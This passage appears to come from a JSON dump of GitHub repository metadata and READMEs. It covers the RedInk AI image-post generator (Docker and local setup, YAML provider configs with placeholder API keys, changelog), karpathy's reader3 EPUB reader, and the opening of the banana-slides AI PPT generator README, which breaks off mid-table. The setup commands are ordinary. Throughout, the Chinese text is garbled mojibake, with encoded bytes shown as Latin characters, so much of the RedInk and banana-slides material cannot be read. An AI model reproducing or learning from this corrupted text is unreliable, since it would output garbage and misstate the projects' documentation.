**æ¡†æ¶**: Vue 3 + TypeScript\n- **æ„å»º**: Vite\n- **çŠ¶æ€ç®¡ç†**: Pinia\n\n---\n\n## ğŸ“¦ å¦‚ä½•è‡ªå·±éƒ¨ç½²\n\n### æ–¹å¼ä¸€ï¼šDocker éƒ¨ç½²ï¼ˆæ¨èï¼‰\n\n**æœ€ç®€å•çš„éƒ¨ç½²æ–¹å¼ï¼Œä¸€è¡Œå‘½ä»¤å³å¯å¯åŠ¨ï¼š**\n\n```bash\ndocker run -d -p 12398:12398 -v ./history:/app/history -v ./output:/app/output histonemax/redink:latest\n```\n\nè®¿é—® http://localhost:12398ï¼Œåœ¨ Web ç•Œé¢çš„**è®¾ç½®é¡µé¢**é…ç½®ä½ çš„ API Key å³å¯ä½¿ç”¨ã€‚\n\n**ä½¿ç”¨ docker-composeï¼ˆå¯é€‰ï¼‰ï¼š**\n\nä¸‹è½½ [docker-compose.yml](https://github.com/HisMax/RedInk/blob/main/docker-compose.yml) åï¼š\n\n```bash\ndocker-compose up -d\n```\n\n**Docker éƒ¨ç½²è¯´æ˜ï¼š**\n- å®¹å™¨å†…ä¸åŒ…å«ä»»ä½• API Keyï¼Œéœ€è¦åœ¨ Web ç•Œé¢é…ç½®\n- ä½¿ç”¨ `-v ./history:/app/history` æŒä¹…åŒ–å†å²è®°å½•\n- ä½¿ç”¨ `-v ./output:/app/output` æŒä¹…åŒ–ç”Ÿæˆçš„å›¾ç‰‡\n- å¯é€‰ï¼šæŒ‚è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ `-v ./text_providers.yaml:/app/text_providers.yaml`\n\n---\n\n### æ–¹å¼äºŒï¼šæœ¬åœ°å¼€å‘éƒ¨ç½²\n\n**å‰ç½®è¦æ±‚ï¼š**\n- Python 3.11+\n- Node.js 18+\n- pnpm\n- uv\n\n### 1. å…‹éš†é¡¹ç›®\n```bash\ngit clone https://github.com/HisMax/RedInk.git\ncd RedInk\n```\n\n### 2. é…ç½® API æœåŠ¡\n\nå¤åˆ¶é…ç½®æ¨¡æ¿æ–‡ä»¶ï¼š\n```bash\ncp text_providers.yaml.example text_providers.yaml\ncp image_providers.yaml.example image_providers.yaml\n```\n\nç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œå¡«å…¥ä½ çš„ API Key å’ŒæœåŠ¡é…ç½®ã€‚ä¹Ÿå¯ä»¥å¯åŠ¨ååœ¨ Web ç•Œé¢çš„**è®¾ç½®é¡µé¢**è¿›è¡Œé…ç½®ã€‚\n\n### 3. å®‰è£…åç«¯ä¾èµ–\n```bash\nuv sync\n```\n\n### 4. å®‰è£…å‰ç«¯ä¾èµ–\n```bash\ncd frontend\npnpm install\n```\n\n### 5. å¯åŠ¨æœåŠ¡\n\n**å¯åŠ¨åç«¯:**\n```bash\nuv run python -m backend.app\n```\nè®¿é—®: http://localhost:12398\n\n**å¯åŠ¨å‰ç«¯:**\n```bash\ncd frontend\npnpm dev\n```\nè®¿é—®: http://localhost:5173\n\n---\n\n## ğŸ® ä½¿ç”¨æŒ‡å—\n\n### åŸºç¡€ä½¿ç”¨\n1. **è¾“å…¥ä¸»é¢˜**: åœ¨é¦–é¡µè¾“å…¥æƒ³è¦åˆ›ä½œçš„ä¸»é¢˜,å¦‚\"å¦‚ä½•åœ¨å®¶åšæ‹¿é“\"\n2. **ç”Ÿæˆå¤§çº²**: AI è‡ªåŠ¨ç”Ÿæˆ 6-9 é¡µçš„å†…å®¹å¤§çº²\n3. **ç¼–è¾‘ç¡®è®¤**: å¯ä»¥ç¼–è¾‘å’Œè°ƒæ•´æ¯ä¸€é¡µçš„æè¿°\n4. **ç”Ÿæˆå›¾ç‰‡**: ç‚¹å‡»ç”Ÿæˆ,å®æ—¶æŸ¥çœ‹è¿›åº¦\n5. **ä¸‹è½½ä½¿ç”¨**: ä¸€é”®ä¸‹è½½æ‰€æœ‰å›¾ç‰‡\n\n### è¿›é˜¶ä½¿ç”¨\n- **ä¸Šä¼ å‚è€ƒå›¾ç‰‡**: é€‚åˆå“ç‰Œæ–¹,ä¿æŒå“ç‰Œè§†è§‰é£æ ¼\n- **ä¿®æ”¹æè¿°è¯**: ç²¾ç¡®æ§åˆ¶æ¯ä¸€é¡µçš„å†…å®¹å’Œæ„å›¾\n- **é‡æ–°ç”Ÿæˆ**: å¯¹ä¸æ»¡æ„çš„é¡µé¢å•ç‹¬é‡æ–°ç”Ÿæˆ\n\n---\n\n## ğŸ”§ é…ç½®è¯´æ˜\n\n### é…ç½®æ–¹å¼\n\né¡¹ç›®æ”¯æŒä¸¤ç§é…ç½®æ–¹å¼ï¼š\n\n1. **Web ç•Œé¢é…ç½®ï¼ˆæ¨èï¼‰**ï¼šå¯åŠ¨æœåŠ¡åï¼Œåœ¨è®¾ç½®é¡µé¢å¯è§†åŒ–é…ç½®\n2. **YAML æ–‡ä»¶é…ç½®**ï¼šç›´æ¥ç¼–è¾‘é…ç½®æ–‡ä»¶\n\n### æ–‡æœ¬ç”Ÿæˆé…ç½®\n\né…ç½®æ–‡ä»¶: `text_providers.yaml`\n\n```yaml\n# å½“å‰æ¿€æ´»çš„æœåŠ¡å•†\nactive_provider: openai\n\nproviders:\n  # OpenAI å®˜æ–¹æˆ–å…¼å®¹æ¥å£\n  openai:\n    type: openai_compatible\n    api_key: sk-xxxxxxxxxxxxxxxxxxxx\n    base_url: https://api.openai.com/v1\n    model: gpt-4o\n\n  # Google Geminiï¼ˆåŸç”Ÿæ¥å£ï¼‰\n  gemini:\n    type: google_gemini\n    api_key: AIzaxxxxxxxxxxxxxxxxxxxxxxxxx\n    model: gemini-2.0-flash\n```\n\n### å›¾ç‰‡ç”Ÿæˆé…ç½®\n\né…ç½®æ–‡ä»¶: `image_providers.yaml`\n\n```yaml\n# å½“å‰æ¿€æ´»çš„æœåŠ¡å•†\nactive_provider: gemini\n\nproviders:\n  # Google Gemini å›¾ç‰‡ç”Ÿæˆ\n  gemini:\n    type: google_genai\n    api_key: AIzaxxxxxxxxxxxxxxxxxxxxxxxxx\n    model: gemini-3-pro-image-preview\n    high_concurrency: false  # é«˜å¹¶å‘æ¨¡å¼\n\n  # OpenAI å…¼å®¹æ¥å£\n  openai_image:\n    type: image_api\n    api_key: sk-xxxxxxxxxxxxxxxxxxxx\n    base_url: https://your-api-endpoint.com\n    model: dall-e-3\n    high_concurrency: false\n```\n\n### é«˜å¹¶å‘æ¨¡å¼è¯´æ˜\n\n- **å…³é—­ï¼ˆé»˜è®¤ï¼‰**ï¼šå›¾ç‰‡é€å¼ ç”Ÿæˆï¼Œé€‚åˆ GCP 300$ è¯•ç”¨è´¦å·æˆ–æœ‰é€Ÿç‡é™åˆ¶çš„ API\n- **å¼€å¯**ï¼šå›¾ç‰‡å¹¶è¡Œç”Ÿæˆï¼ˆæœ€å¤š15å¼ åŒæ—¶ï¼‰ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œä½†éœ€è¦ API æ”¯æŒé«˜å¹¶å‘\n\nâš ï¸ **GCP 300$ è¯•ç”¨è´¦å·ä¸å»ºè®®å¯ç”¨é«˜å¹¶å‘**ï¼Œå¯èƒ½ä¼šè§¦å‘é€Ÿç‡é™åˆ¶å¯¼è‡´ç”Ÿæˆå¤±è´¥ã€‚\n\n---\n\n## âš ï¸ æ³¨æ„äº‹é¡¹\n\n1. **API é…é¢é™åˆ¶**:\n   - æ³¨æ„ Gemini å’Œå›¾ç‰‡ç”Ÿæˆ API çš„è°ƒç”¨é…é¢\n   - GCP è¯•ç”¨è´¦å·å»ºè®®å…³é—­é«˜å¹¶å‘æ¨¡å¼\n\n2. **ç”Ÿæˆæ—¶é—´**:\n   - å›¾ç‰‡ç”Ÿæˆéœ€è¦æ—¶é—´,è¯·è€å¿ƒç­‰å¾…ï¼ˆä¸è¦ç¦»å¼€é¡µé¢ï¼‰\n\n---\n\n## ğŸ¤ å‚ä¸è´¡çŒ®\n\næ¬¢è¿æäº¤ Issue å’Œ Pull Request!\n\nå¦‚æœè¿™ä¸ªé¡¹ç›®å¯¹ä½ æœ‰å¸®åŠ©,æ¬¢è¿ç»™ä¸ª Star â­\n\n### æœªæ¥è®¡åˆ’\n- [ ] æ”¯æŒæ›´å¤šå›¾ç‰‡æ ¼å¼ï¼Œä¾‹å¦‚ä¸€å¥è¯ç”Ÿæˆä¸€å¥—PPTä»€ä¹ˆçš„\n- [x] å†å²è®°å½•ç®¡ç†ä¼˜åŒ–\n- [ ] å¯¼å‡ºä¸ºå„ç§æ ¼å¼(PDFã€é•¿å›¾ç­‰)\n\n---\n\n## æ›´æ–°æ—¥å¿—\n\n### v1.4.0 (2025-11-30)\n- ğŸ—ï¸ åç«¯æ¶æ„é‡æ„ï¼šæ‹†åˆ†å•ä½“è·¯ç”±ä¸ºæ¨¡å—åŒ–è“å›¾ï¼ˆhistoryã€imagesã€generationã€outlineã€configï¼‰\n- ğŸ—ï¸ å‰ç«¯ç»„ä»¶é‡æ„ï¼šæå–å¯å¤ç”¨ç»„ä»¶ï¼ˆImageGalleryModalã€OutlineModalã€ShowcaseBackgroundç­‰ï¼‰\n- âœ¨ ä¼˜åŒ–é¦–é¡µè®¾è®¡ï¼Œç§»é™¤å†—ä½™å†…å®¹åŒºå—\n- âœ¨ èƒŒæ™¯å›¾ç‰‡é¢„åŠ è½½å’Œæ¸å…¥åŠ¨ç”»ï¼Œæå‡åŠ è½½ä½“éªŒ\n- âœ¨ å†å²è®°å½•æŒä¹…åŒ–æ”¯æŒï¼ˆDockeréƒ¨ç½²ï¼‰\n- ğŸ”§ ä¿®å¤å†å²è®°å½•é¢„è§ˆå’Œå¤§çº²æŸ¥çœ‹åŠŸèƒ½\n- ğŸ”§ ä¼˜åŒ–Modalç»„ä»¶å¯è§æ€§æ§åˆ¶\n- ğŸ§ª æ–°å¢65ä¸ªåç«¯å•å…ƒæµ‹è¯•\n\n### v1.3.0 (2025-11-26)\n- âœ¨ æ–°å¢ Docker æ”¯æŒï¼Œä¸€é”®éƒ¨ç½²\n- âœ¨ å‘å¸ƒå®˜æ–¹ Docker é•œåƒåˆ° Docker Hub: `histonemax/redink`\n- ğŸ”§ Flask è‡ªåŠ¨æ£€æµ‹å‰ç«¯æ„å»ºäº§ç‰©ï¼Œæ”¯æŒå•å®¹å™¨éƒ¨ç½²\n- ğŸ”§ Docker é•œåƒå†…ç½®ç©ºç™½é…ç½®æ¨¡æ¿ï¼Œä¿æŠ¤ API Key å®‰å…¨\n- ğŸ“ æ›´æ–° READMEï¼Œæ·»åŠ  Docker éƒ¨ç½²è¯´æ˜\n\n### v1.2.0 (2025-11-26)\n- âœ¨ æ–°å¢ç‰ˆæƒä¿¡æ¯å±•ç¤ºï¼Œæ‰€æœ‰é¡µé¢æ˜¾ç¤ºå¼€æºåè®®å’Œé¡¹ç›®é“¾æ¥\n- âœ¨ ä¼˜åŒ–å›¾ç‰‡é‡æ–°ç”ŸæˆåŠŸèƒ½ï¼Œæ”¯æŒå•å¼ å›¾ç‰‡é‡ç»˜\n- âœ¨ é‡æ–°ç”Ÿæˆå›¾ç‰‡æ—¶ä¿æŒé£æ ¼ä¸€è‡´ï¼Œä¼ é€’å®Œæ•´ä¸Šä¸‹æ–‡ï¼ˆå°é¢å›¾ã€å¤§çº²ã€ç”¨æˆ·è¾“å…¥ï¼‰\n- âœ¨ ä¿®å¤å›¾ç‰‡ç¼“å­˜é—®é¢˜ï¼Œé‡æ–°ç”Ÿæˆçš„å›¾ç‰‡ç«‹å³åˆ·æ–°æ˜¾ç¤º\n- âœ¨ ç»Ÿä¸€æ–‡æœ¬ç”Ÿæˆå®¢æˆ·ç«¯æ¥å£ï¼Œæ”¯æŒ Google Gemini å’Œ OpenAI å…¼å®¹æ¥å£è‡ªåŠ¨åˆ‡æ¢\n- âœ¨ æ–°å¢ Web ç•Œé¢é…ç½®åŠŸèƒ½ï¼Œå¯è§†åŒ–ç®¡ç† API æœåŠ¡å•†\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:23.362687"
  },
  {
    "basic_info": {
      "name": "reader3",
      "full_name": "karpathy/reader3",
      "owner": "karpathy",
      "description": "Quick illustration of how one can easily read books together with LLMs. It's great and I highly recommend it.",
      "url": "https://github.com/karpathy/reader3",
      "clone_url": "https://github.com/karpathy/reader3.git",
      "ssh_url": "git@github.com:karpathy/reader3.git",
      "homepage": null,
      "created_at": "2025-11-18T02:37:00Z",
      "updated_at": "2025-12-13T21:21:59Z",
      "pushed_at": "2025-11-18T02:37:51Z"
    },
    "stats": {
      "stars": 2613,
      "forks": 333,
      "watchers": 2613,
      "open_issues": 12,
      "size": 271
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 13925,
        "HTML": 8921
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# reader 3\n\n![reader3](reader3.png)\n\nA lightweight, self-hosted EPUB reader that lets you read through EPUB books one chapter at a time. This makes it very easy to copy paste the contents of a chapter to an LLM, to read along. Basically - get epub books (e.g. [Project Gutenberg](https://www.gutenberg.org/) has many), open them up in this reader, copy paste text around to your favorite LLM, and read together and along.\n\nThis project was 90% vibe coded just to illustrate how one can very easily [read books together with LLMs](https://x.com/karpathy/status/1990577951671509438). I'm not going to support it in any way, it's provided here as is for other people's inspiration and I don't intend to improve it. Code is ephemeral now and libraries are over, ask your LLM to change it in whatever way you like.\n\n## Usage\n\nThe project uses [uv](https://docs.astral.sh/uv/). So for example, download [Dracula EPUB3](https://www.gutenberg.org/ebooks/345) to this directory as `dracula.epub`, then:\n\n```bash\nuv run reader3.py dracula.epub\n```\n\nThis creates the directory `dracula_data`, which registers the book to your local library. We can then run the server:\n\n```bash\nuv run server.py\n```\n\nAnd visit [localhost:8123](http://localhost:8123/) to see your current Library. You can easily add more books, or delete them from your library by deleting the folder. It's not supposed to be complicated or complex.\n\n## License\n\nMIT",
      "default_branch": "master"
    },
    "fetched_at": "2025-12-14T02:54:24.457326"
  },
  {
    "basic_info": {
      "name": "banana-slides",
      "full_name": "Anionex/banana-slides",
      "owner": "Anionex",
      "description": "ä¸€ä¸ªåŸºäºnano banana proğŸŒçš„åŸç”ŸAI PPTç”Ÿæˆåº”ç”¨ï¼Œè¿ˆå‘çœŸæ­£çš„ï¼‚Vibe PPTï¼‚; æ”¯æŒä¸Šä¼ ä»»æ„æ¨¡æ¿å›¾ç‰‡ï¼›ä¸Šä¼ ä»»æ„ç´ æ&æ™ºèƒ½è§£æï¼›ä¸€å¥è¯/å¤§çº²/é¡µé¢æè¿°è‡ªåŠ¨ç”ŸæˆPPTï¼›å£å¤´ä¿®æ”¹æŒ‡å®šåŒºåŸŸã€ä¸€é”®å¯¼å‡º - An AI-native PPT generator based on nano banana proğŸŒ",
      "url": "https://github.com/Anionex/banana-slides",
      "clone_url": "https://github.com/Anionex/banana-slides.git",
      "ssh_url": "git@github.com:Anionex/banana-slides.git",
      "homepage": "",
      "created_at": "2025-11-29T17:37:26Z",
      "updated_at": "2025-12-14T02:50:51Z",
      "pushed_at": "2025-12-13T16:16:37Z"
    },
    "stats": {
      "stars": 2580,
      "forks": 286,
      "watchers": 2580,
      "open_issues": 19,
      "size": 24124
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 356569,
        "TypeScript": 332568,
        "JavaScript": 2236,
        "CSS": 2026,
        "Batchfile": 1907,
        "Shell": 1891,
        "Dockerfile": 1731,
        "HTML": 624
      },
      "license": "Other",
      "topics": [
        "ai-ppt-maker",
        "ai-slide-builder",
        "ai-slides",
        "llm",
        "nanobananapro",
        "ppt",
        "ppt-generator",
        "slides",
        "text2image"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<img width=\"256\" src=\"https://github.com/user-attachments/assets/6f9e4cf9-912d-4faa-9d37-54fb676f547e\">\n\n*Vibe your PPT like vibing code.*\n\n**ä¸­æ–‡ | [English](README_EN.md)**\n\n<p>\n\n[![GitHub Stars](https://img.shields.io/github/stars/Anionex/banana-slides?style=square)](https://github.com/Anionex/banana-slides/stargazers)\n[![GitHub Forks](https://img.shields.io/github/forks/Anionex/banana-slides?style=square)](https://github.com/Anionex/banana-slides/network)\n[![GitHub Watchers](https://img.shields.io/github/watchers/Anionex/banana-slides?style=square)](https://github.com/Anionex/banana-slides/watchers)\n\n[![Version](https://img.shields.io/badge/version-v0.1.0-4CAF50.svg)](https://github.com/Anionex/banana-slides)\n![Docker](https://img.shields.io/badge/Docker-Build-2496ED?logo=docker&logoColor=white)\n[![GitHub issues](https://img.shields.io/github/issues-raw/Anionex/banana-slides)](https://github.com/Anionex/banana-slides/issues)\n[![GitHub pull requests](https://img.shields.io/github/issues-pr-raw/Anionex/banana-slides)](https://github.com/Anionex/banana-slides/pulls)\n\n\n</p> \n\n<b>ä¸€ä¸ªåŸºäºnano banana proğŸŒçš„åŸç”ŸAI PPTç”Ÿæˆåº”ç”¨ï¼Œæ”¯æŒæƒ³æ³•/å¤§çº²/é¡µé¢æè¿°ç”Ÿæˆå®Œæ•´PPTæ¼”ç¤ºæ–‡ç¨¿ï¼Œ<br></b>\n<b> è‡ªåŠ¨æå–é™„ä»¶å›¾è¡¨ã€ä¸Šä¼ ä»»æ„ç´ æã€å£å¤´æå‡ºä¿®æ”¹ï¼Œè¿ˆå‘çœŸæ­£çš„\"Vibe PPT\" </b>\n\n<b>ğŸ¯ é™ä½PPTåˆ¶ä½œé—¨æ§›ï¼Œè®©æ¯ä¸ªäººéƒ½èƒ½å¿«é€Ÿåˆ›ä½œå‡ºç¾è§‚ä¸“ä¸šçš„æ¼”ç¤ºæ–‡ç¨¿</b>\n\n<br>\n\n*å¦‚æœè¯¥é¡¹ç›®å¯¹ä½ æœ‰ç”¨, æ¬¢è¿starğŸŒŸ &  forkğŸ´*\n\n<br>\n\n</p>\n\n</div>\n\n\n\n## âœ¨ é¡¹ç›®ç¼˜èµ·\nä½ æ˜¯å¦ä¹Ÿæ›¾é™·å…¥è¿™æ ·çš„å›°å¢ƒï¼šæ˜å¤©å°±è¦æ±‡æŠ¥ï¼Œä½†PPTè¿˜æ˜¯ä¸€ç‰‡ç©ºç™½ï¼›è„‘ä¸­æœ‰æ— æ•°ç²¾å½©çš„æƒ³æ³•ï¼Œå´è¢«ç¹ççš„æ’ç‰ˆå’Œè®¾è®¡æ¶ˆç£¨æ‰æ‰€æœ‰çƒ­æƒ…ï¼Ÿ\n\næˆ‘(ä»¬)æ¸´æœ›èƒ½å¿«é€Ÿåˆ›ä½œå‡ºæ—¢ä¸“ä¸šåˆå…·è®¾è®¡æ„Ÿçš„æ¼”ç¤ºæ–‡ç¨¿ï¼Œä¼ ç»Ÿçš„AI PPTç”Ÿæˆappï¼Œè™½ç„¶å¤§ä½“æ»¡è¶³â€œå¿«â€è¿™ä¸€éœ€æ±‚ï¼Œå´è¿˜å­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š\n\n- 1ï¸âƒ£åªèƒ½é€‰æ‹©é¢„è®¾æ¨¡ç‰ˆï¼Œæ— æ³•çµæ´»è°ƒæ•´é£æ ¼\n- 2ï¸âƒ£è‡ªç”±åº¦ä½ï¼Œå¤šè½®æ”¹åŠ¨éš¾ä»¥è¿›è¡Œ \n- 3ï¸âƒ£æˆå“è§‚æ„Ÿç›¸ä¼¼ï¼ŒåŒè´¨åŒ–ä¸¥é‡\n- 4ï¸âƒ£ç´ æè´¨é‡è¾ƒä½ï¼Œç¼ºä¹é’ˆå¯¹æ€§\n- 5ï¸âƒ£å›¾æ–‡æ’ç‰ˆå‰²è£‚ï¼Œè®¾è®¡æ„Ÿå·®\n\nä»¥ä¸Šè¿™äº›ç¼ºé™·ï¼Œè®©ä¼ ç»Ÿçš„AI pptç”Ÿæˆå™¨éš¾ä»¥åŒæ—¶æ»¡è¶³æˆ‘ä»¬â€œå¿«â€å’Œâ€œç¾â€çš„ä¸¤å¤§PPTåˆ¶ä½œéœ€æ±‚ã€‚å³ä½¿è‡ªç§°Vibe PPTï¼Œä½†æ˜¯åœ¨æˆ‘çš„çœ¼ä¸­è¿˜è¿œä¸å¤Ÿâ€œVibeâ€ã€‚\n\nä½†æ˜¯ï¼Œnano bananağŸŒæ¨¡å‹çš„å‡ºç°è®©ä¸€åˆ‡æœ‰äº†è½¬æœºã€‚æˆ‘å°è¯•ä½¿ç”¨ğŸŒproè¿›è¡Œppté¡µé¢ç”Ÿæˆï¼Œå‘ç°ç”Ÿæˆçš„ç»“æœæ— è®ºæ˜¯è´¨é‡ã€ç¾æ„Ÿè¿˜æ˜¯ä¸€è‡´æ€§ï¼Œéƒ½åšçš„éå¸¸å¥½ï¼Œä¸”å‡ ä¹èƒ½ç²¾ç¡®æ¸²æŸ“promptè¦æ±‚çš„æ‰€æœ‰æ–‡å­—+éµå¾ªå‚è€ƒå›¾çš„é£æ ¼ã€‚é‚£ä¸ºä»€ä¹ˆä¸åŸºäºğŸŒproï¼Œåšä¸€ä¸ªåŸç”Ÿçš„\"Vibe PPT\"åº”ç”¨å‘¢ï¼Ÿ\n\n## ğŸ‘¨â€ğŸ’» é€‚ç”¨åœºæ™¯\n\n1. **å°ç™½**ï¼šé›¶é—¨æ§›å¿«é€Ÿç”Ÿæˆç¾è§‚PPTï¼Œæ— éœ€è®¾è®¡ç»éªŒï¼Œå‡å°‘æ¨¡æ¿é€‰æ‹©çƒ¦æ¼\n2. **PPTä¸“ä¸šäººå£«**ï¼šå‚è€ƒAIç”Ÿæˆçš„å¸ƒå±€å’Œå›¾æ–‡å…ƒç´ ç»„åˆï¼Œå¿«é€Ÿè·å–è®¾è®¡çµæ„Ÿ\n3. **æ•™è‚²å·¥ä½œè€…**ï¼šå°†æ•™å­¦å†…å®¹å¿«é€Ÿè½¬æ¢ä¸ºé…å›¾æ•™æ¡ˆPPTï¼Œæå‡è¯¾å ‚æ•ˆæœ\n4. **å­¦ç”Ÿ**ï¼šå¿«é€Ÿå®Œæˆä½œä¸šPreï¼ŒæŠŠç²¾åŠ›ä¸“æ³¨äºå†…å®¹è€Œéæ’ç‰ˆç¾åŒ–\n5. **èŒåœºäººå£«**ï¼šå•†ä¸šææ¡ˆã€äº§å“ä»‹ç»å¿«é€Ÿå¯è§†åŒ–ï¼Œå¤šåœºæ™¯å¿«é€Ÿé€‚é…\n\n\n## ğŸ¨ ç»“æœæ¡ˆä¾‹\n\n\n<div align=\"center\">\n\n| | |\n|:---:|:---:|\n| <img src=\"https://github.com/user-attachments/assets/d58ce3f7-bcec-451d-a3b9-ca3c16223644\" width=\"500\" alt=\"æ¡ˆä¾‹3\"> | <img src=\"https://github.com/user-attachments/assets/c64cd952-2cdf-4a92-8c34-0322cbf3de4e\" width=\"500\" alt=\"æ¡ˆä¾‹2\"> |\n| **è½¯ä»¶å¼€å‘æœ€ä½³å®è·µ** | **DeepSeek-V3.2æŠ€æœ¯å±•ç¤º** |\n| <img src=\"https://github.com/user-attachments/assets/383eb011-a167-4343-99eb-e1d0568830c7\" width=\"500\" alt=\"æ¡ˆä¾‹4\"> | <img src=\"https://github.com/user-attachments/assets/1a63afc9-ad05-4755-8480-fc4aa64987f1\" width=\"500\" alt=\"æ¡ˆä¾‹1\"> |\n| **é¢„åˆ¶èœæ™ºèƒ½äº§çº¿è£…å¤‡ç ”å‘å’Œäº§ä¸šåŒ–** | **é’±çš„æ¼”å˜ï¼šä»è´å£³åˆ°çº¸å¸çš„æ—…ç¨‹** |\n\n</div>\n\næ›´å¤šå¯è§<a href=\"https://github.com/Anionex/banana-slides/issues/2\" > ä½¿ç”¨æ¡ˆä¾‹ </a>\n\n\n## ğŸ¯ åŠŸèƒ½ä»‹ç»\n\n### 1. çµæ´»å¤šæ ·çš„åˆ›ä½œè·¯å¾„\næ”¯æŒ**æƒ³æ³•**ã€**å¤§çº²**ã€**é¡µé¢æè¿°**ä¸‰ç§èµ·æ­¥æ–¹å¼ï¼Œæ»¡è¶³ä¸åŒåˆ›ä½œä¹ æƒ¯ã€‚\n- **ä¸€å¥è¯ç”Ÿæˆ**ï¼šè¾“å…¥ä¸€ä¸ªä¸»é¢˜ï¼ŒAI è‡ªåŠ¨ç”Ÿæˆç»“æ„æ¸…æ™°çš„å¤§çº²å’Œé€é¡µå†…å®¹æè¿°ã€‚\n- **è‡ªç„¶è¯­è¨€ç¼–è¾‘**ï¼šæ”¯æŒä»¥ Vibe å½¢å¼å£å¤´ä¿®æ”¹å¤§çº²æˆ–æè¿°ï¼ˆå¦‚\"æŠŠç¬¬ä¸‰é¡µæ”¹æˆæ¡ˆä¾‹åˆ†æ\"ï¼‰ï¼ŒAI å®æ—¶å“åº”è°ƒæ•´ã€‚\n- **å¤§çº²/æè¿°æ¨¡å¼**ï¼šæ—¢å¯ä¸€é”®æ‰¹é‡ç”Ÿæˆï¼Œä¹Ÿå¯æ‰‹åŠ¨è°ƒæ•´ç»†èŠ‚ã€‚\n\n<img width=\"2000\" height=\"1125\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7fc1ecc6-433d-4157-b4ca-95fcebac66ba\" />\n\n\n### 2. å¼ºå¤§çš„ç´ æè§£æèƒ½åŠ›\n- **å¤šæ ¼å¼æ”¯æŒ**ï¼šä¸Šä¼  PDF/Docx/MD/Txt ç­‰æ–‡ä»¶ï¼Œåå°è‡ªåŠ¨è§£æå†…å®¹ã€‚\n- **æ™ºèƒ½æå–**ï¼šè‡ªåŠ¨è¯†åˆ«æ–‡æœ¬ä¸­çš„å…³é”®ç‚¹ã€å›¾ç‰‡é“¾æ¥å’Œå›¾è¡¨ä¿¡æ¯ï¼Œä¸ºç”Ÿæˆæä¾›ä¸°å¯Œç´ æã€‚\n- **é£æ ¼å‚è€ƒ**ï¼šæ”¯æŒä¸Šä¼ å‚è€ƒå›¾ç‰‡æˆ–æ¨¡æ¿ï¼Œå®šåˆ¶ PPT é£æ ¼ã€‚\n\n<img width=\"1920\" height=\"1080\" alt=\"æ–‡ä»¶è§£æä¸ç´ æå¤„ç†\" src=\"https://github.com/user-attachments/assets/8cda1fd2-2369-4028-b310-ea6604183936\" />\n\n### 3. \"Vibe\" å¼è‡ªç„¶è¯­è¨€ä¿®æ”¹\nä¸å†å—é™äºå¤æ‚çš„èœå•æŒ‰é’®ï¼Œç›´æ¥é€šè¿‡**è‡ªç„¶è¯­è¨€**ä¸‹è¾¾ä¿®æ”¹æŒ‡ä»¤ã€‚\n- **å±€éƒ¨é‡ç»˜**ï¼šå¯¹ä¸æ»¡æ„çš„åŒºåŸŸè¿›è¡Œå£å¤´å¼ä¿®æ”¹ï¼ˆå¦‚\"æŠŠè¿™ä¸ªå›¾æ¢æˆé¥¼å›¾\"ï¼‰ã€‚\n- **æ•´é¡µä¼˜åŒ–**ï¼šåŸºäº nano banana proğŸŒ ç”Ÿæˆé«˜æ¸…ã€é£æ ¼ç»Ÿä¸€çš„é¡µé¢ã€‚\n\n<img width=\"2000\" height=\"1125\" alt=\"image\" src=\"https://github.com/user-attachments/assets/929ba24a-996c-4f6d-9ec6-818be6b08ea3\" />\n\n\n### 4. å¼€ç®±å³ç”¨çš„æ ¼å¼å¯¼å‡º\n- **å¤šæ ¼å¼æ”¯æŒ**ï¼šä¸€é”®å¯¼å‡ºæ ‡å‡† **PPTX** æˆ– **PDF** æ–‡ä»¶ã€‚\n- **å®Œç¾é€‚é…**ï¼šé»˜è®¤ 16:9 æ¯”ä¾‹ï¼Œæ’ç‰ˆæ— éœ€äºŒæ¬¡è°ƒæ•´ï¼Œç›´æ¥æ¼”ç¤ºã€‚\n\n<img width=\"1000\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3e54bbba-88be-4f69-90a1-02e875c25420\" />\n<img width=\"1748\" height=\"538\" alt=\"PPTä¸PDFå¯¼å‡º\" src=\"https://github.com/user-attachments/assets/647eb9b1-d0b6-42cb-a898-378ebe06c984\" />\n\n\n## ğŸ—ºï¸ å¼€å‘è®¡åˆ’\n\n| çŠ¶æ€ | é‡Œç¨‹ç¢‘ |\n| --- | --- |\n| âœ… å·²å®Œæˆ | ä»æƒ³æ³•ã€å¤§çº²ã€é¡µé¢æè¿°ä¸‰ç§è·¯å¾„åˆ›å»º PPT |\n| âœ… å·²å®Œæˆ | è§£ææ–‡æœ¬ä¸­çš„ Markdown æ ¼å¼å›¾ç‰‡ |\n| âœ… å·²å®Œæˆ | PPT å•é¡µæ·»åŠ æ›´å¤šç´ æ |\n| âœ… å·²å®Œæˆ | PPT å•é¡µæ¡†é€‰åŒºåŸŸVibeå£å¤´ç¼–è¾‘ |\n| âœ… å·²å®Œæˆ | ç´ ææ¨¡å—: ç´ æç”Ÿæˆã€ä¸Šä¼ ç­‰ |\n| âœ… å·²å®Œæˆ | æ”¯æŒå¤šç§æ–‡ä»¶çš„ä¸Šä¼ +è§£æ |\n| âœ… å·²å®Œæˆ | æ”¯æŒVibeå£å¤´è°ƒæ•´å¤§çº²å’Œæè¿° |\n| ğŸ”„ è¿›è¡Œä¸­ | æ”¯æŒå·²ç”Ÿæˆå›¾ç‰‡çš„å…ƒç´ åˆ†å‰²å’Œè¿›ä¸€æ­¥ç¼–è¾‘ï¼ˆsegment + inpaintï¼‰ |\n| ğŸ”„ è¿›è¡Œä¸­ | ç½‘ç»œæœç´¢ |\n| ğŸ”„ è¿›è¡Œä¸­ | Agent æ¨¡å¼ |\n| ğŸ§­ è§„åˆ’ä¸­ | ä¼˜åŒ–å‰ç«¯åŠ è½½é€Ÿåº¦ |\n| ğŸ§­ è§„åˆ’ä¸­ | åœ¨çº¿æ’­æ”¾åŠŸèƒ½ |\n| ğŸ§­ è§„åˆ’ä¸­ | ç®€å•çš„åŠ¨ç”»å’Œé¡µé¢åˆ‡æ¢æ•ˆæœ |\n| ğŸ§­ è§„åˆ’ä¸­ | 